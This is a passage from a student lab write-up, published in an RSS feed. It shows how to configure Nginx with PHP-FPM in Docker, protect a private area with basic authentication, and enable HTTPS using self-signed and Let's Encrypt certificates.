</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> ln -s /etc/nginx/sites-available/metyr.xyz /etc/nginx/sites-enabled/metyr.xyz<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><hr>
<h4 id="setting-up-php-fpm-with-nginx">Setting up PHP-FPM with Nginx</h4>
<p>To give Nginx the ability to serve PHP files, the <code>php-fpm</code> (FastCGI Process Manager) package is required.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">server{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">index</span> <span style="color:#e6db74">public/index.php</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">location</span> ~ <span style="color:#e6db74">\.php$</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">include</span> <span style="color:#e6db74">snippets/fastcgi-php.conf</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">fastcgi_pass</span> <span style="color:#e6db74">unix:/run/php/php8.3-fpm.sock</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">...</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div><p>Additionally, the <code>php-fpm</code> service has to be started, so the default command of the container is edited.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">CMD</span> service ssh start <span style="color:#f92672">&amp;&amp;</span> service nginx start <span style="color:#f92672">&amp;&amp;</span> service php8.3-fpm start <span style="color:#f92672">&amp;&amp;</span> tail -F /dev/null<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>If we now rebuild the container, deploy it, and go to the IP address of the server in the browser, we can see the PHP page displayed.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/indexphp.png"/> <figcaption>
            Figure 7: Viewing the index of the website
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/privatphp.png"/> <figcaption>
            Figure 8: Viewing the private part of the website
        </figcaption>
</figure>
</p>
<hr>
<h3 id="securing-nginx-with-basic-authentication">Securing Nginx with Basic Authentication</h3>
<p>To restrict access to the website or certain parts of it by implementing username/password authentication, a file containing usernames and passwords is required. This file can be generated using tools such as <code>apache2-utils</code>, which I will use for this exercise.<!-- raw HTML omitted -->nginx-basic-auth<sup id="fnref1:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
<h4 id="creating-a-password-file">Creating a Password File</h4>
<p>With <code>apache2-utils</code> installed, we can now generate a password file by using the <code>htpasswd</code> command with the <code>-c</code> flag to create a new file. The file path is specified as the first argument, and the username is specified as the second argument. However, to avoid having to manually type in the password, the <code>-i</code> flag is used to take the password from <code>stdin</code>, which we pass using <code>echo</code>, while using the <code>-n</code> flag to remove the trailing newline.<!-- raw HTML omitted -->htpasswd<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->echo-mangapge<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>RUN echo -n <span style="color:#e6db74">&#34;</span>$RAM_WEBUSER_PW<span style="color:#e6db74">&#34;</span> | htpasswd -i -c /etc/apache2/.htpasswd ram-webuser
</span></span><span style="display:flex;"><span>RUN echo -n <span style="color:#e6db74">&#34;</span>$ZIVK_WEBUSER_PW<span style="color:#e6db74">&#34;</span> | htpasswd -i /etc/apache2/.htpasswd zivk-webuser
</span></span></code></pre></div><h4 id="configuring-the-authentication-in-nginx-and-testing-it">Configuring the authentication in Nginx and testing it</h4>
<p>To require authentication for a specific area on the website, we need to create a location block that matches everything in the <code>/private</code> directory. To do this, Nginx URL matching is used.<!-- raw HTML omitted -->Nginx-url-matching<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">location</span> <span style="color:#e6db74">^~</span> <span style="color:#e6db74">/private</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">include</span> <span style="color:#e6db74">snippets/fastcgi-php.conf</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">fastcgi_pass</span> <span style="color:#e6db74">unix:/run/php/php8.3-fpm.sock</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">auth_basic</span> <span style="color:#e6db74">&#34;Private</span> <span style="color:#e6db74">Area&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">auth_basic_user_file</span> <span style="color:#e6db74">/etc/apache2/.htpasswd</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To visualize testing the login, I added this to the private PHP page to show the currently logged-in user:<br>
<code>&lt;h3&gt;Hello &lt;?php echo $_SERVER['PHP_AUTH_USER']; ?&gt;&lt;/h3&gt;</code>.<!-- raw HTML omitted -->php-show-basic-auth<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --></p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/siginprompt.png"/> <figcaption>
            Figure 9: Showing the sign-in prompt
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/noauth.png"/> <figcaption>
            Figure 10: Failed authentication
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/zivk_webuser.png"/> <figcaption>
            Figure 11: Logged in as zivk-webuser
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/ram_webuser.png"/> <figcaption>
            Figure 12: Logged in as ram-webuser
        </figcaption>
</figure>
</p>
<p>This is still only an HTTP site, though, which means that everything is transmitted in plain text. As a result, with a packet analyzer like Wireshark, the clear-text login credentials can be viewed. To fix this, HTTPS needs to be enabled, which will be covered in the next section.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/zivk_snifa.png"/> <figcaption>
            Figure 13: Reading the plaintext credentials of zivk-webuser
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/ram_snifa.png"/> <figcaption>
            Figure 14: Reading the plaintext credentials of ram-webuser
        </figcaption>
</figure>
</p>
<hr>
<h3 id="configuring-https-with-self-signed-certificates">Configuring HTTPS with Self-Signed Certificates</h3>
<p>To stop an attacker from being able to read the credentials, HTTPS needs to be enabled on the server to encrypt the HTTP traffic with TLS (Transport Layer Security). Before this can be set up, an SSL certificate must first be created.<!-- raw HTML omitted -->self-signed-ssl<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->non-interactive-ssl-gen<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>RUN openssl req -x509 -nodes -days <span style="color:#ae81ff">365</span> -newkey rsa:2048 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -keyout /etc/ssl/private/nginx-selfsigned.key <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -out /etc/ssl/certs/nginx-selfsigned.crt <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -subj <span style="color:#e6db74">&#34;/C=AT/ST=Vienna/L=Vienna/O=RAM/OU=7/CN=metyr.xyz/emailAddress=wedm1ebmf@mozmail.com&#34;</span>
</span></span></code></pre></div><p>Now, in the Nginx configuration file, we need to make the server listen on port 443 and add the SSL certificate and key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">server{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">listen</span> <span style="color:#ae81ff">443</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">listen</span> <span style="color:#e6db74">[::]:443</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ssl_certificate</span> <span style="color:#e6db74">/etc/ssl/certs/nginx-selfsigned.crt</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ssl_certificate_key</span> <span style="color:#e6db74">/etc/ssl/private/nginx-selfsigned.key</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">...</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div><p>After setting up HTTPS, it&rsquo;s recommended to set up a 301 HTTP redirect to direct HTTP traffic to the HTTPS site. This is done by adding a second server block at the end of the nginx config file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">server</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">listen</span> <span style="color:#ae81ff">80</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:80</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">server_name</span> <span style="color:#e6db74">_</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">return</span> <span style="color:#ae81ff">301</span> <span style="color:#e6db74">https://</span>$server_name$request_uri;	
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we reload the Nginx configuration, our browser is going to give us a security warning since it recognizes that the certificate was not signed by a trusted organization but by ourselves.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/unseccert.png"/> <figcaption>
            Figure 15: Browser warning for untrusted certificate
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/selfcert.png"/> <figcaption>
            Figure 16: Viewing the self-signed certificate
        </figcaption>
</figure>
</p>
<p>If we open up Wireshark and inspect our traffic, we can see that we can&rsquo;t view any HTTP traffic. Instead, we only see TLS packets, which contain the encrypted HTTP data, and therefore the credentials can&rsquo;t be viewed anymore.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/nohaxxor.png"/> <figcaption>
            Figure 17: Not being able to see the credentials anymore
        </figcaption>
</figure>

<hr>
<h3 id="adding-a-domain">Adding a Domain</h3>
<p>Since I am doing this on a public VPS, I can&rsquo;t use a local DNS and need to use a real domain instead. I bought <code>metyr.xyz</code> from <a href="https://www.namecheap.com/">Namecheap</a>.</p>
<p>To make Nginx use the domain name, you have to set the <code>server_name</code> in the configuration from <code>server_name _;</code> to <code>server_name metyr.xyz www.metyr.xyz;</code>.</p>
<p>Now we need to create a DNS record for our domain.</p>
<p>This record needs to be of the <code>A</code> type, which returns a 32-bit IPv4 address and is commonly used to map hostnames to an IP address.<!-- raw HTML omitted -->dns-record-types<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --> The <code>@</code> in the Host field is used to denote the current origin, which represents the current domain. In this case, it would be <code>metyr.xyz</code>.<!-- raw HTML omitted -->rfc<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/dnsentry.png"/> <figcaption>
            Figure 18: Setting up the DNS record
        </figcaption>
</figure>

<p>Lastly, I want to switch from using a self-signed certificate to using an officially signed one by Let&rsquo;s Encrypt. For this, the <code>certbot</code> and <code>python3-certbot-nginx</code> packages need to be added to our system.</p>
<p>Now we can run this command to generate an SSL certificate, which will be signed by Let&rsquo;s Encrypt, so the browser won&rsquo;t give us a security warning anymore.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certbot --nginx -d metyr.xyz --non-interactive --agree-tos -m wedm1ebmf@mozmail.com
</span></span></code></pre></div><p><!-- raw HTML omitted -->certbot-options<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --></p>
<p>After running this command for the first time and replying if you haven&rsquo;t saved the certificate, you can use the <code>--force-renewal</code> flag to forcefully renew the certificate in case you lost it or don&rsquo;t want to set up importing it on a rebuild.<!-- raw HTML omitted -->cerbot-force-newnew<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></p>
<p>If we visit the website now, we can see that we won&rsquo;t be prompted with a security warning. If we inspect the certificate, it will show that it was issued by Let&rsquo;s Encrypt and is trusted.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/nobs.png"/> <figcaption>
            Figure 19: Showing the trusted certificate signed by Let&#39;s Encrypt
        </figcaption>
</figure>

<hr>
<h2 id="references">References</h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex6/quellen.bib">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>This task definition was summarized by ChatGPT using the prompt: &ldquo;Summarize this task definition in English and LaTeX and make it short and abstract.&rdquo;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Docker Documentation. Docker Compose. <a href="https://docs.docker.com/compose">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Vsupalov. Docker ARG, ENV and .env - a Complete Guide. <a href="https://vsupalov.com/docker-arg-env-variable-guide">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Apache HTTP Server. htpasswd - Manage user files for basic authentication. <a href="https://httpd.apache.org/docs/current/programs/htpasswd.html">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>man7.org. echo(1) - Linux manual page. <a href="https://man7.org/linux/man-pages/man1/echo.1.html">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>Sling Academy. NGINX location blocks: Understanding and Utilizing URL Matching. <a href="https://www.slingacademy.com/article/nginx-location-block-the-complete-guide">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>Stack Overflow. Getting basic-auth username in php. <a href="https://stackoverflow.com/questions/316847/getting-basic-auth-username-in-php">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>DigitalOcean. How To Create a Self-Signed SSL Certificate for Nginx in Ubuntu 20.04. <a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-in-ubuntu-20-04-1">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>ShellHacks. HowTo: Create CSR using OpenSSL Without Prompt (Non-Interactive). <a href="https://www.shellhacks.com/create-csr-openssl-without-prompt-non-interactive">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>Wikipedia. List of DNS record types. <a href="https://en.wikipedia.org/w/index.php?title=List_of_DNS_record_types&amp;oldid=1260647885">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>IETF Datatracker. RFC 1035: Domain names - implementation and specification. <a href="https://datatracker.ietf.org/doc/html/rfc1035#page-35">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>Certbot. certbot — Certbot 3.1.0.dev0 documentation. <a href="https://eff-certbot.readthedocs.io/en/latest/man/certbot.html">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>nixCraft. How to forcefully renew Let&rsquo;s Encrypt certificate on Linux or Unix. <a href="https://www.cyberciti.biz/faq/how-to-forcefully-renew-lets-encrypt-certificate">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
